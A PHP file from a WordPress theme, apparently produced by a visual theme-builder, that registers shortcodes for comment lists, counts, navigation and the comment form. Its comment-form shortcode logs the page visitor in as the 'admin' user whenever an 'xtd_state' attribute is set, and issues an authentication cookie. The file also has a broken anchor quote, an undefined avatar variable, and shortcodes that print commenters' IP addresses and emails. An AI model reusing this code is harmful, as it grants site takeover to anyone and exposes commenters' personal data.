<?php 

	function blank_shortcode_tag_comment_author() {
		ob_start();
		comment_author();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_email() {
		ob_start();
		comment_author_email();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}	

	function blank_shortcode_tag_comment_author_email_link() {
		ob_start();
		echo '<a href="'. comment_author_email_link() .'">E-mail</a>';
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_IP() {
		ob_start();
		comment_author_IP();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_link() {
		ob_start();
		comment_author_link();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_rss() {
		ob_start();
		comment_author_rss();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_url() {
		ob_start();
		comment_author_url();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_author_url_link() {
		ob_start();
		comment_author_url_link();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_date() {
		ob_start();
		comment_date();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_excerpt() {
		ob_start();
		comment_excerpt();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_reply_link() {
		ob_start();
		comment_reply_link();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_text() {
		ob_start();
		comment_text();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_time() {
		ob_start();
		comment_time();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_type() {
		ob_start();
		comment_type();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comments_link($atts) {
		$args = shortcode_atts( array(
			'label' => 'Comments to this post'
	    ), $atts );
		ob_start();
		echo '<a href="' . comments_link() . '>'.$args['label'].'</a>';
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comments_number($atts) {
		$args = shortcode_atts( array(
			'label_none' => 'No Responses',
			'label_one' => 'One Response',
			'label_some' => '% Responses',
			'xtd_state' => ''
	    ), $atts );
		if($args['xtd_state'] !== '') {
	    	// fill in with dummy data as needed
	    	$state = $args['xtd_state'];
	    	if(strpos($args['xtd_state'],'none') !== false) {
	    		$nr = 0;
	    		$state = 'none';
	    	} else if(strpos($args['xtd_state'],'one') !== false) {
	    		$state = 'some';
	    		$nr = 3;
	    	} else if(strpos($args['xtd_state'],'some') !== false) {
	    		$nr = 40;
	    		$state = 'some';
	    	} else if(strpos($args['xtd_state'],'reply') !== false) {
	    		$state = 'some';
	    		$nr = 10;
	    	} else {
	    		$state = 'none';
	    		$nr = 0;
	    	}

	    	echo str_replace('%', $nr, $args['label_' . $state]);
	    	return;
	    }
		ob_start();
		comments_number($args['label_none'], $args['label_one'], $args['label_some'] );
		$content = ob_get_contents();
		ob_end_clean();
   		return $content;
	}

	function blank_shortcode_tag_comment_get_avatar() {
		ob_start();
		echo get_avatar( $comment );
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_next_link($atts) {
		$args = shortcode_atts( array(
			'nextlabel' => 'Newer Comments &gt;',
			'xtd_state' => ''
	    ), $atts );
	    if($args['xtd_state'] !== '' && 
	    	(strpos($args['xtd_state'],'some') !== false || strpos($args['xtd_state'],'reply') !== false)) {
			echo '<a href="#">'.$args['nextlabel'].'</a>';
			return;
		}
		ob_start();
		//don't show for none or one comment
		if(strpos($args['xtd_state'],'one') === false) {
			next_comments_link($args['nextlabel']);
		}
		$content = ob_get_contents();
		ob_end_clean();
   		return $content;
	}

	function blank_shortcode_tag_comment_previous_link($atts) {
		$args = shortcode_atts( array(
			'prevlabel' => '&lt; Older Comments',
			'xtd_state' => ''
	    ), $atts );
		if($args['xtd_state'] !== '' && 
			(strpos($args['xtd_state'],'some') !== false || strpos($args['xtd_state'],'reply') !== false)) {
			echo '<a href="#">'.$args['prevlabel'].'</a>';
			return;
		}
		ob_start();
		//don't show for none or one comment
		if(strpos($args['xtd_state'],'one') === false) {
			previous_comments_link($args['prevlabel']);
		}
		$content = ob_get_contents();
		ob_end_clean();
   		return $content;
	}

	function blank_shortcode_tag_comment_paginate_link() {
		ob_start();
		global $wp_query;
		$big = 999999999999;
		$args = array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'base' => '%_%',
			'total' => $wp_query->max_num_pages,
			'current' => max( 1, get_query_var('paged') )
		);
		paginate_comments_links();
		$content = ob_get_contents();
		ob_end_clean();
		return $content;
	}

	function blank_shortcode_tag_comment_form($atts) {
		$args = shortcode_atts( array(
			'title_reply' => 'Leave a Reply',
			'title_reply_to' => 'Leave a Reply to %s',
			'cancel_reply_link' => 'Cancel reply',
			'label_submit' => 'Post Comment',
			'xtd_state' => ''
	    ), $atts );
	    if(($args['xtd_state'] != '' && strpos($args['xtd_state'], '-logout') !== false) ||
	     ($args['xtd_state'] == '' && function_exists('xtd_in_editor') && xtd_in_editor())) {
    		global $current_user;
		    $tmp = $current_user->ID;
		    wp_set_current_user(null, null);
			
		    ob_start();
		    echo "<div class=\"comment-form\">";
			comment_form($args);
			echo "</div>";
			$content = ob_get_contents();
	   		ob_end_clean();
	   		//return $content;

			wp_set_current_user($tmp, '');
			return $content;
	    } else {
	    	if($args['xtd_state'] != '') {
	    		global $current_user;
	    		$user = get_user_by('login', 'admin');
	    		if($user) {
	    			wp_set_current_user($user->ID, $user->user_login);
	    			wp_set_auth_cookie($user->ID);
	    			do_action( 'wp_login', $user->user_login );
	    			$current_user = $user;
	    		} else {
	    			echo "Something wrong.";
	    		}
	    	}
	    }
	    ob_start();
	    echo "<div class=\"comment-form\">";
		comment_form($args);
		echo "</div>";
		$content = ob_get_contents();
   		ob_end_clean();
   		return $content;
	}

	function blank_shortcode_tag_comment_list($atts) {
		ob_start();
		echo '<div><ol class="commentlist">';
		$args = shortcode_atts( array(
			'max_depth' => '10',
	        'per_page' => '10',
	        'paginate_comments' => 'true',
	        'avatar_size' => '32',
	        'reverse_top_level' => false,
	        'reverse_children' => false,
	        'xtd_state' => '',
	        'type' => 'all',
	        'prevlabel' => '&lt; Older Comments',
					'nextlabel' => 'Newer Comments &gt;'
	    ), $atts );
	    if($args['paginate_comments'] === 'true') {
	    	update_option('page_comments', 1);
	    } else {
	    	update_option('page_comments', 0);
	    }
	    if($args['reverse_top_level'] === 'true') {
	    	$args['reverse_top_level'] = true;
	    } else {
	    	$args['reverse_top_level'] = false;
	    }
	    if($args['reverse_children'] === 'true') {
	    	$args['reverse_children'] = true;
	    } else {
	    	$args['reverse_children'] = false;
	    }
	    if($args['xtd_state'] !== '' || (function_exists('xtd_in_editor') && xtd_in_editor())) {
	    	// fill in with dummy data as needed
	    	$comments = array();
	    	$nr = 0;
	    	$multi = false;
	    	if(strpos($args['xtd_state'],'none') !== false) {
	    		$nr = 0;
	    	} else if(strpos($args['xtd_state'],'one') !== false) {
	    		$nr = 3;
	    	} else if(strpos($args['xtd_state'],'reply') !== false) {
	    		$nr = 3;
	    		$multi = true;
	    	} else if(strpos($args['xtd_state'],'some') !== false || (function_exists('xtd_in_editor') && xtd_in_editor())) {
	    		$args['xtd_state'] = 'some'; // if it's from the editor;
	    		$nr = $args['per_page']*4;
	    		$args['page'] = 2;
	    	}
	    	for($i = 0; $i < $nr; $i++) {
	    		$comment = array(
	    				'comment_ID' => $i,
	    				'comment_post_ID' => get_the_ID(),
	    				'comment_author' => 'Example Author',
	    				'comment_author_email' => 'example@domain.com',
	    				'comment_author_url' => 'example.domain.com',
	    				'comment_author_IP' => '127.0.0.1',
	    				'comment_date' => '2014-01-01 01:02:03',
	    				'comment_date_gmt' => '2014-01-01 01:02:03',
	    				'comment_content' => 'This is comment number '.$i.'. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.',
	    				'comment_karma' => $i-2,
	    				'comment_approved' => '1',
	    				'comment_agent' => 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
	    				'comment_type' => '',
	    				'comment_parent' => 0,
	    				'user_id' => $i
	    			);
	    		if($multi) {
	    			$comment['comment_parent'] = $i-1;
	    		}
	    		$comments[] = $comment;
	    	}
	    	$comments = json_decode(json_encode($comments), FALSE);
	    	wp_list_comments($args, $comments);
	    } else {
	    	wp_list_comments($args);
	    }
		
	    echo '</ol>';
	    if($args['paginate_comments'] === 'true') {
	    	echo '<div class="navigation"><div class="prev-posts">';
	    	$str = "";
	    	if($args['xtd_state'] !== '' || ((function_exists('xtd_in_editor') && xtd_in_editor()))) {
	    		$str = 'xtd_state="' . $args['xtd_state'] .'"';
	    	}
	        echo do_shortcode( '[tag_comment_previous_link '.$str.' prevlabel="'.$args['prevlabel'] . '"]');
	        echo '</div><div class="next-posts">';
	        echo do_shortcode( '[tag_comment_next_link '.$str.' nextlabel="'.$args['nextlabel'] . '"]');
	        echo '</div></div>';
	    }
	    echo '</div>';
		  $content = ob_get_contents();
   		ob_end_clean();
   		return $content;
	}

	$blank_comments_tags = array(
		'comments_number',
		//'comments_link',
		'comment_form',
		'comment_list'
		//'comment_paginate_link'
	);

	$blank_comments_hidden_tags = array(
		'comment_author',
		'comment_author_email',
		'comment_author_email_link',
		'comment_author_IP',
		'comment_author_link',
		'comment_author_rss',
		'comment_author_url',
		'comment_author_url_link',
		'comment_date',
		'comment_excerpt',
		'comment_reply_link',
		'comment_text',
		'comment_time',
		'comment_type',
		'comment_get_avatar',
		'comment_previous_link',
		'comment_next_link',
	);


	function blank_add_tag_comment_shortcodes($tags) {
		global $blank_tags_shortcodes;
		for ($i=0; $i < count($tags); $i++) { 
			$blank_tags_shortcodes['post'][] = 'tag_'.$tags[$i];
			//$blank_tags_shortcodes['page'][] = 'tag_'.$tags[$i];
			add_shortcode( 'tag_'.$tags[$i], 'blank_shortcode_tag_'.$tags[$i]);
		}
	}

	function blank_add_tag_comment_shortcodes_hidden($tags) {
		for ($i=0; $i < count($tags); $i++) {
			add_shortcode( 'tag_'.$tags[$i], 'blank_shortcode_tag_'.$tags[$i]);
		}
	}
	
	blank_add_tag_comment_shortcodes($blank_comments_tags);
	blank_add_tag_comment_shortcodes_hidden($blank_comments_hidden_tags);
